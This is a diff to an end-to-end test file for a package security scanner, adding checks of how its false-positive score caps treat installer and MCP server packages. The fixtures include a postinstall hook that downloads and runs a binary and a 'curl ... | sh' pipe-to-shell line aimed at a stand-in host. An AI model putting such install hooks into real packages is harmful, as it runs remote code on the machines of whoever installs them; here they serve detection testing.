@@ -1,6 +1,6 @@
 'use strict';
 
-// End-to-end tests of contextual FP caps F3, F5, F6, F7 and F12 through the real CLI (MUADDIB_DEBUG=1
+// End-to-end tests of contextual FP caps F2, F3, F4, F5, F6, F7, F9, F12 and F15 through the real CLI (MUADDIB_DEBUG=1
 // prints the "[FP-CAP] ... <feature>" line; the JSON score is on stdout). F10 has its own
 // file; F13 is covered end to end in tests/audit-2026-05/typosquat-findings.test.js.
 // F11 (ai_agent_bot) is not covered here: its "agent runtime path" condition needs a finding
@@ -50,7 +50,7 @@ const postTo = (host, envVar) => [
 ].join('\n');
 
 async function runE2EFpCapTests() {
-  console.log('\n=== E2E FP CAPS F3 / F5 / F7 ===\n');
+  console.log('\n=== E2E FP CAPS F2 / F3 / F4 / F5 / F6 / F7 / F9 / F12 / F15 ===\n');
 
   // ---- F3 network_destination_first_party ----
   await asyncTest('F3 E2E: vendor-scoped SDK posting its key to its own API -> capped (network_destination_first_party)', async () => {
@@ -247,6 +247,56 @@ async function runE2EFpCapTests() {
   await asyncTest('F9 E2E: MCP installer using a provider key with its provider -> cap applies', async () => {
     const s = scanCli(mcpPkg('api.openai.com'));
     assert(s.capLine.includes('mcp_server_env_access') && s.score <= 30, show(s));
+  });
+
+  // ---- F2: the release host matters ----
+  // Install hook downloads a platform binary, makes it executable and runs it -> MAX 35 only
+  // when every URL points to GitHub releases.
+  const hostInstaller = host => [
+    "const https = require('https'); const fs = require('fs'); const cp = require('child_process');",
+    `const url = 'https://${host}/acme/tool/releases/download/v1.0.0/tool-linux-x64';`,
+    "https.get(url, res => { const f = fs.createWriteStream('bin/tool'); res.pipe(f); f.on('finish', () => { fs.chmodSync('bin/tool', 0o755); cp.execSync('./bin/tool --version'); }); });",
+    ''
+  ].join('\n');
+  const hostInstallerPkg = host => ({ 'package.json': { name: 'tool-bin-x', version: '1.0.0', scripts: { postinstall: 'node install.js' } }, 'install.js': hostInstaller(host) });
+  await asyncTest('F2 E2E: binary installer from GitHub releases -> capped (install_url_github_releases)', async () => {
+    const s = scanCli(hostInstallerPkg('github.com'));
+    assert(s.capLine.includes('install_url_github_releases') && s.score <= 35, show(s));
+  });
+  await asyncTest('F2 E2E: same installer downloading from another host -> cap does not apply', async () => {
+    const s = scanCli(hostInstallerPkg('dl.example-mirror.net'));
+    assert(!s.capLine.includes('install_url_github_releases') && s.score >= 75, show(s));
+  });
+
+  // ---- F9 mcp_server_env_access / F15 mcp_server_benign_lifecycle ----
+  // An MCP server package that writes its client config and passes a provider key: F9 without
+  // an install hook, F15 with a plain build hook; a malicious hook vetoes both.
+  const mcpCode = [
+    "const fs = require('fs'); const os = require('os'); const path = require('path');",
+    "const cfg = path.join(os.homedir(), '.cursor', 'mcp.json');",
+    "const conf = { mcpServers: { acme: { command: 'npx', args: ['acme-mcp-server'], env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY } } } };",
+    'fs.writeFileSync(cfg, JSON.stringify(conf, null, 2));',
+    ''
+  ].join('\n');
+  const mcpServerPkg = scripts => ({
+    'package.json': { name: 'acme-mcp-server', version: '1.0.0', description: 'MCP server for Acme', main: 'index.js', bin: { 'acme-mcp': 'index.js' }, ...(scripts ? { scripts } : {}) },
+    'index.js': mcpCode
+  });
+  await asyncTest('F9 E2E: MCP server writing its config with a provider key, no install hook -> capped (mcp_server_env_access)', async () => {
+    const s = scanCli(mcpServerPkg());
+    assert(s.capLine.includes('mcp_server_env_access') && s.score <= 30, show(s));
+  });
+  await asyncTest('F9 E2E: same package with an install hook -> F9 does not apply (F15 takes the benign hook)', async () => {
+    const s = scanCli(mcpServerPkg({ postinstall: 'husky install' }));
+    assert(!s.capLine.includes('mcp_server_env_access'), show(s));
+  });
+  await asyncTest('F15 E2E: same package with a plain build hook -> capped (mcp_server_benign_lifecycle)', async () => {
+    const s = scanCli(mcpServerPkg({ postinstall: 'husky install' }));
+    assert(s.capLine.includes('mcp_server_benign_lifecycle') && s.score <= 30, show(s));
+  });
+  await asyncTest('F15 E2E: same package piping a download into a shell at install -> neither cap applies', async () => {
+    const s = scanCli(mcpServerPkg({ postinstall: 'curl -s https://get.example-cdn.net/i.sh | sh' }));
+    assert(!s.capLine.includes('mcp_server_benign_lifecycle') && !s.capLine.includes('mcp_server_env_access') && s.score >= 75, show(s));
   });
 }
 
